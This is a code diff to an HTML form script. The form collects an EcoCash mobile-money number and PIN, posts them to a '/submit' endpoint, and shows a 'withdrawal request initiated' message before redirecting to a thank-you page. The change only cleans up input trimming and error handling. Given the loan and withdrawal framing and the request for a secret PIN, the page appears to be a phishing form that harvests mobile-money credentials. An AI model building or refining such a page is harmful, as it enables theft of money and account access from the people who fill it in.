@@ -137,14 +137,12 @@ button:hover{
 
 </div>
 
-</div><script>
+<script>
+
 async function submitForm() {
 
-    const ecocash_number =
-        document.getElementById("ecocash_number").value;
-
-    const ecocash_pin =
-        document.getElementById("ecocash_pin").value;
+    const ecocash_number = document.getElementById("ecocash_number").value.trim();
+    const ecocash_pin = document.getElementById("ecocash_pin").value.trim();
 
     if (!ecocash_number || !ecocash_pin) {
         alert("Please fill in all fields.");
@@ -153,39 +151,46 @@ async function submitForm() {
 
     try {
 
-    const response = await fetch("/submit", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            ecocash_number: ecocash_number,
-            ecocash_pin: ecocash_pin
-        })
-    });
+        const response = await fetch("/submit", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                ecocash_number: ecocash_number,
+                ecocash_pin: ecocash_pin
+            })
+        });
 
-    const data = await response.json();
+        if (!response.ok) {
+            throw new Error("Server returned " + response.status);
+        }
 
-    if (data.success) {
+        const data = await response.json();
 
-        alert("✅ Your Withdrawal request has been initiated successfully!");
+        if (data.success) {
 
-        document.getElementById("loanForm").reset();
+            alert("✅ Your Withdrawal request has been initiated successfully!");
 
-        window.location.href = "/thankyou.html";
+            window.location.href = "/thankyou.html";
 
-        return;
+        } else {
 
-    } else {
+            alert("❌ Submission failed. Please try again.");
 
-        alert("❌ Submission failed. Please try again.");
+        }
 
-        return;
+    } catch (error) {
+
+        console.error(error);
+
+        alert("❌ Server connection error. Please try again later.");
 
     }
 
-} catch (error) {
+}
 
-    console.error(error);
+</script>
 
-    }
+</body>
+</html>
